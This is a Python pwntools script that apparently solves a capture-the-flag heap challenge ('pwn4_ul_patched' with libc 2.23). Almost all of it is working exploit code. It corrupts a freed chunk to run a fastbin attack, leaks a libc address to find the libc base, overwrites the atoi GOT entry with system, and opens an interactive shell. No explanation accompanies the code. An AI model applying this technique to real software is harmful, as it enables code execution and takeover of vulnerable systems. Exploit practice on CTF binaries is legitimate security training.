#!/usr/bin/python3
import struct
from pwn import *

exe = ELF('pwn4_ul_patched', checksec=False)
libc = ELF('libc.2.23.so', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b*0x0000000000400d6c

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()


def create(idx, size, data):
    sla(b">\n", b"1")
    sla(b"Index:", idx)
    sla(b"size:", size)
    sa(b"data:", data)


def delete(idx):
    sla(b">\n", b"4")
    sla(b":", idx)


def show(idx):
    sla(b">\n", b"2")
    sla(b":", idx)


def edit(idx, size, data):
    sla(b">\n", b"3")
    sla(b"index:", idx)
    sla(b"newsize:", size)
    sla(b"(y/n)?\n", b"y")
    sa(b"data:", data)


create(b"0", b"16", b"a" * 16)
create(b"1", b"104", b"a" * 64)
delete(b"1")
payload = flat(
    b"c" * 16,
    0, 0x71,
    0x6020a0-3
)
edit(b"0", b"96", payload)

create(b"3", b"104", b"b" * 64)
create(b"4", b"104", b"aaaa")
show(b"4")
p.recvuntil(b"aaa")
libc_leak = + u64(p.recvline(keepends=False) + b"\0\0") +127
info("libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x39b8e0
info("libc base: " + hex(libc.address))
payload = b"a" * 3 
payload+= flat(
    libc.address + 0x39b8e0, 0,
    libc.address + 0x39c540, 0,
    0, 0,
    exe.got['atoi']
)
edit(b"4", b"104", payload)
edit(b"0", b"104", p64(libc.sym['system']))

p.interactive()
